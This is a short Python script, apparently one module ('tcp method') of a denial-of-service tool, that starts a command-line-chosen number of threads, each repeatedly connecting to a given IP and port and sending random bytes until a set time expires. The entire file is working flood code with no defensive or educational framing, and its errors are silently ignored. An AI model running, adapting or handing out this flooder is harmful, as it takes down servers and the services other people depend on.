
# tcp method

import socket, time, random, threading
from sys import argv
from threading import Thread

def tcp(ip, port, floodtime, size):
	while time.time() < floodtime:
		with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
			try:
				sock.connect((ip, port))
				while time.time() < floodtime:
					sock.send(random._urandom(size))
			except:
				pass

for _ in range(int(argv[5])):
        Thread(target=tcp, args=(str(argv[1]), int(argv[2]), time.time() + int(argv[3]), int(4))).start()
